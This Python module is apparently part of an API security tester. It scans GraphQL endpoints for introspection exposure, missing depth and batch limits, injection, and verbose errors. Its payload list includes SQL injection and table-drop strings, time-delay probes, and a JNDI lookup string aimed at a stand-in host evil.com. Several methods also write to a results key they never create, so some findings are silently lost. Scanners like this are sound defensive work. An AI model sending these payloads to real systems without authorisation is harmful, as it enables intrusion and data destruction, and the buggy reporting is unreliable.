"""
GraphQL Security Analyzer
Comprehensive security analysis for GraphQL APIs including introspection, injection testing, depth limiting, and query analysis.
"""

import json
import logging
import re
from typing import Dict, List, Any, Optional

import requests
from rich.console import Console

from ..utils.debug_utils import debug_print

class GraphQLAnalyzer:
    """GraphQL security analyzer."""
    
    def __init__(self, debug: bool = False):
        """Initialize the GraphQL analyzer."""
        self.debug = debug
        self.console = Console()
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'APISecurityTester/1.0',
            'Content-Type': 'application/json'
        })
        
        # GraphQL injection payloads
        self.injection_payloads = [
            "' OR '1'='1",
            "'; DROP TABLE users; --",
            "{{7*7}}",
            "${jndi:ldap://evil.com/a}",
            "'; WAITFOR DELAY '00:00:05'--",
            "'; SELECT SLEEP(5); --"
        ]
        
        # Malicious GraphQL queries
        self.malicious_queries = [
            # Introspection query
            """
            query IntrospectionQuery {
              __schema {
                queryType { name }
                mutationType { name }
                subscriptionType { name }
                types {
                  ...FullType
                }
                directives {
                  name
                  description
                  locations
                  args {
                    ...InputValue
                  }
                }
              }
            }
            fragment FullType on __Type {
              kind
              name
              description
              fields(includeDeprecated: true) {
                name
                description
                args {
                  ...InputValue
                }
                type {
                  ...TypeRef
                }
                isDeprecated
                deprecationReason
              }
              inputFields {
                ...InputValue
              }
              interfaces {
                ...TypeRef
              }
              enumValues(includeDeprecated: true) {
                name
                description
                isDeprecated
                deprecationReason
              }
              possibleTypes {
                ...TypeRef
              }
            }
            fragment InputValue on __InputValue {
              name
              description
              type { ...TypeRef }
              defaultValue
            }
            fragment TypeRef on __Type {
              kind
              name
              ofType {
                kind
                name
                ofType {
                  kind
                  name
                  ofType {
                    kind
                    name
                    ofType {
                      kind
                      name
                      ofType {
                        kind
                        name
                        ofType {
                          kind
                          name
                          ofType {
                            kind
                            name
                          }
                        }
                      }
                    }
                  }
                }
              }
            }
            """,
            
            # Deep nested query
            """
            query DeepQuery {
              users {
                posts {
                  comments {
                    author {
                      posts {
                        comments {
                          author {
                            posts {
                              comments {
                                author {
                                  name
                                }
                              }
                            }
                          }
                        }
                      }
                    }
                  }
                }
              }
            }
            """,
            
            # Batch query
            """
            query BatchQuery {
              user1: user(id: 1) { name email }
              user2: user(id: 2) { name email }
              user3: user(id: 3) { name email }
              user4: user(id: 4) { name email }
              user5: user(id: 5) { name email }
            }
            """
        ]
    
    def analyze(self, endpoint: str, schema: str = None, 
                queries: List[str] = None) -> Dict[str, Any]:
        """Perform comprehensive GraphQL security analysis."""
        debug_print("Starting GraphQL analysis for:", endpoint)
        
        results = {
            "endpoint": endpoint,
            "introspection_enabled": False,
            "schema_exposed": False,
            "depth_limiting": False,
            "rate_limiting": False,
            "authentication_required": False,
            "injection_vulnerabilities": [],
            "information_disclosure": [],
            "vulnerabilities": []
        }
        
        try:
            # Test introspection
            introspection_results = self._test_introspection(endpoint)
            results.update(introspection_results)
            
            # Test depth limiting
            depth_results = self._test_depth_limiting(endpoint)
            results.update(depth_results)
            
            # Test injection vulnerabilities
            injection_results = self._test_injection(endpoint)
            results["injection_vulnerabilities"] = injection_results
            
            # Test information disclosure
            info_results = self._test_information_disclosure(endpoint)
            results["information_disclosure"] = info_results
            
            # Test batch queries
            batch_results = self._test_batch_queries(endpoint)
            results.update(batch_results)
            
            # Test field suggestions
            suggestions_results = self._test_field_suggestions(endpoint)
            results.update(suggestions_results)
            
            # Test error handling
            error_results = self._test_error_handling(endpoint)
            results.update(error_results)
            
            # Generate vulnerability summary
            self._generate_vulnerability_summary(results)
            
        except Exception as e:
            debug_print("Error during GraphQL analysis:", str(e))
            results["error"] = str(e)
        
        return results
    
    def _test_introspection(self, endpoint: str) -> Dict[str, Any]:
        """Test if introspection is enabled."""
        debug_print("Testing GraphQL introspection")
        
        results = {
            "introspection_enabled": False,
            "schema_exposed": False,
            "introspection_data": None
        }
        
        try:
            # Send introspection query
            payload = {
                "query": self.malicious_queries[0]  # Introspection query
            }
            
            response = self.session.post(endpoint, json=payload, timeout=10)
            
            if response.status_code == 200:
                data = response.json()
                
                if "data" in data and "__schema" in data["data"]:
                    results["introspection_enabled"] = True
                    results["schema_exposed"] = True
                    results["introspection_data"] = data["data"]["__schema"]
                    
                    # Add vulnerability
                    results["vulnerabilities"].append({
                        "type": "introspection_enabled",
                        "severity": "high",
                        "description": "GraphQL introspection is enabled, exposing schema information",
                        "impact": "Information disclosure of API structure and types"
                    })
                    
                    debug_print("Introspection enabled - schema exposed")
                else:
                    debug_print("Introspection disabled or blocked")
            else:
                debug_print(f"Introspection test failed with status: {response.status_code}")
                
        except Exception as e:
            debug_print("Error testing introspection:", str(e))
        
        return results
    
    def _test_depth_limiting(self, endpoint: str) -> Dict[str, Any]:
        """Test for depth limiting protection."""
        debug_print("Testing GraphQL depth limiting")
        
        results = {
            "depth_limiting": False,
            "max_depth": None,
            "depth_bypass_possible": False
        }
        
        try:
            # Test deep nested query
            payload = {
                "query": self.malicious_queries[1]  # Deep nested query
            }
            
            response = self.session.post(endpoint, json=payload, timeout=30)
            
            if response.status_code == 200:
                data = response.json()
                
                if "errors" in data:
                    error_message = str(data["errors"]).lower()
                    if "depth" in error_message or "complexity" in error_message:
                        results["depth_limiting"] = True
                        debug_print("Depth limiting is enabled")
                    else:
                        results["depth_bypass_possible"] = True
                        results["vulnerabilities"].append({
                            "type": "depth_limiting_bypass",
                            "severity": "medium",
                            "description": "Deep nested queries allowed, potential DoS risk",
                            "impact": "Resource exhaustion through complex queries"
                        })
                        debug_print("Depth limiting bypass possible")
                else:
                    results["depth_bypass_possible"] = True
                    results["vulnerabilities"].append({
                        "type": "depth_limiting_bypass",
                        "severity": "medium",
                        "description": "Deep nested queries executed successfully",
                        "impact": "Resource exhaustion through complex queries"
                    })
                    debug_print("Deep query executed successfully")
            else:
                debug_print(f"Depth limiting test failed with status: {response.status_code}")
                
        except Exception as e:
            debug_print("Error testing depth limiting:", str(e))
        
        return results
    
    def _test_injection(self, endpoint: str) -> List[Dict[str, Any]]:
        """Test for injection vulnerabilities in GraphQL."""
        debug_print("Testing GraphQL injection vulnerabilities")
        
        vulnerabilities = []
        
        # Test injection in query variables
        for payload in self.injection_payloads:
            try:
                query = """
                query TestInjection($input: String!) {
                  search(query: $input) {
                    id
                    name
                  }
                }
                """
                
                variables = {
                    "input": payload
                }
                
                payload_data = {
                    "query": query,
                    "variables": variables
                }
                
                response = self.session.post(endpoint, json=payload_data, timeout=10)
                
                if response.status_code == 200:
                    data = response.json()
                    
                    # Check for injection indicators
                    if self._detect_injection_success(data, payload):
                        vulnerabilities.append({
                            "type": "injection",
                            "severity": "high",
                            "payload": payload,
                            "description": f"Potential injection vulnerability with payload: {payload}",
                            "impact": "Data manipulation or unauthorized access"
                        })
                        
            except Exception as e:
                debug_print(f"Error testing injection with payload {payload}:", str(e))
        
        return vulnerabilities
    
    def _test_information_disclosure(self, endpoint: str) -> List[Dict[str, Any]]:
        """Test for information disclosure in GraphQL responses."""
        debug_print("Testing GraphQL information disclosure")
        
        issues = []
        
        try:
            # Test with simple query
            query = """
            query TestInfo {
              __typename
            }
            """
            
            payload = {"query": query}
            response = self.session.post(endpoint, json=payload, timeout=10)
            
            if response.status_code == 200:
                data = response.json()
                
                # Check for detailed error messages
                if "errors" in data:
                    for error in data["errors"]:
                        if "message" in error:
                            message = error["message"]
                            
                            # Check for sensitive information
                            sensitive_patterns = [
                                r"database.*error",
                                r"sql.*error",
                                r"stack.*trace",
                                r"exception.*details",
                                r"internal.*error"
                            ]
                            
                            for pattern in sensitive_patterns:
                                if re.search(pattern, message, re.IGNORECASE):
                                    issues.append({
                                        "type": "information_disclosure",
                                        "severity": "medium",
                                        "description": f"Detailed error message exposed: {message}",
                                        "impact": "Information disclosure in error messages"
                                    })
                                    break
                
                # Check response headers
                sensitive_headers = [
                    "server", "x-powered-by", "x-graphql-version"
                ]
                
                for header in sensitive_headers:
                    if header in response.headers:
                        issues.append({
                            "type": "information_disclosure",
                            "severity": "low",
                            "description": f"Sensitive header '{header}' exposed",
                            "value": response.headers[header]
                        })
                        
        except Exception as e:
            debug_print("Error testing information disclosure:", str(e))
        
        return issues
    
    def _test_batch_queries(self, endpoint: str) -> Dict[str, Any]:
        """Test for batch query vulnerabilities."""
        debug_print("Testing GraphQL batch queries")
        
        results = {
            "batch_queries_allowed": False,
            "batch_limit": None
        }
        
        try:
            # Test batch query
            payload = {
                "query": self.malicious_queries[2]  # Batch query
            }
            
            response = self.session.post(endpoint, json=payload, timeout=30)
            
            if response.status_code == 200:
                data = response.json()
                
                if "data" in data:
                    results["batch_queries_allowed"] = True
                    results["vulnerabilities"].append({
                        "type": "batch_query_vulnerability",
                        "severity": "medium",
                        "description": "Batch queries allowed, potential resource abuse",
                        "impact": "Resource exhaustion through multiple queries"
                    })
                    debug_print("Batch queries allowed")
                else:
                    debug_print("Batch queries blocked")
            else:
                debug_print(f"Batch query test failed with status: {response.status_code}")
                
        except Exception as e:
            debug_print("Error testing batch queries:", str(e))
        
        return results
    
    def _test_field_suggestions(self, endpoint: str) -> Dict[str, Any]:
        """Test for field suggestion vulnerabilities."""
        debug_print("Testing GraphQL field suggestions")
        
        results = {
            "field_suggestions_enabled": False
        }
        
        try:
            # Test with invalid field
            query = """
            query TestSuggestions {
              user {
                invalidField
              }
            }
            """
            
            payload = {"query": query}
            response = self.session.post(endpoint, json=payload, timeout=10)
            
            if response.status_code == 200:
                data = response.json()
                
                if "errors" in data:
                    for error in data["errors"]:
                        if "message" in error:
                            message = error["message"]
                            
                            # Check for field suggestions
                            if "did you mean" in message.lower() or "suggestions" in message.lower():
                                results["field_suggestions_enabled"] = True
                                results["vulnerabilities"].append({
                                    "type": "field_suggestion_vulnerability",
                                    "severity": "low",
                                    "description": "Field suggestions enabled in error messages",
                                    "impact": "Information disclosure of available fields"
                                })
                                debug_print("Field suggestions enabled")
                                break
                
        except Exception as e:
            debug_print("Error testing field suggestions:", str(e))
        
        return results
    
    def _test_error_handling(self, endpoint: str) -> Dict[str, Any]:
        """Test GraphQL error handling."""
        debug_print("Testing GraphQL error handling")
        
        results = {
            "error_handling_secure": True,
            "error_details_exposed": False
        }
        
        try:
            # Test with malformed query
            query = """
            query TestError {
              user {
                name
                email
              }
            }
            """
            
            # Remove closing brace to create syntax error
            malformed_query = query.replace("}", "")
            
            payload = {"query": malformed_query}
            response = self.session.post(endpoint, json=payload, timeout=10)
            
            if response.status_code == 200:
                data = response.json()
                
                if "errors" in data:
                    for error in data["errors"]:
                        if "locations" in error or "path" in error:
                            results["error_details_exposed"] = True
                            results["error_handling_secure"] = False
                            results["vulnerabilities"].append({
                                "type": "error_handling_vulnerability",
                                "severity": "low",
                                "description": "Detailed error information exposed",
                                "impact": "Information disclosure in error responses"
                            })
                            debug_print("Error details exposed")
                            break
                
        except Exception as e:
            debug_print("Error testing error handling:", str(e))
        
        return results
    
    def _detect_injection_success(self, data: Dict[str, Any], payload: str) -> bool:
        """Detect if injection was successful."""
        indicators = [
            "sql syntax",
            "mysql error",
            "oracle error",
            "postgresql error",
            "sqlite error",
            "syntax error",
            "unclosed quotation mark",
            "unterminated string",
            "division by zero",
            "stack trace",
            "exception"
        ]
        
        data_str = json.dumps(data).lower()
        
        # Check for error indicators
        for indicator in indicators:
            if indicator in data_str:
                return True
        
        # Check for payload reflection
        if payload.lower() in data_str:
            return True
        
        return False
    
    def _generate_vulnerability_summary(self, results: Dict[str, Any]):
        """Generate vulnerability summary for GraphQL analysis."""
        if "vulnerabilities" not in results:
            results["vulnerabilities"] = []
        
        # Add issues from other tests
        for issue_list in ["injection_vulnerabilities", "information_disclosure"]:
            if issue_list in results:
                results["vulnerabilities"].extend(results[issue_list])
        
        # Categorize vulnerabilities
        critical = [v for v in results["vulnerabilities"] if v.get("severity") == "critical"]
        high = [v for v in results["vulnerabilities"] if v.get("severity") == "high"]
        medium = [v for v in results["vulnerabilities"] if v.get("severity") == "medium"]
        low = [v for v in results["vulnerabilities"] if v.get("severity") == "low"]
        
        results["vulnerability_summary"] = {
            "total": len(results["vulnerabilities"]),
            "critical": len(critical),
            "high": len(high),
            "medium": len(medium),
            "low": len(low)
        } 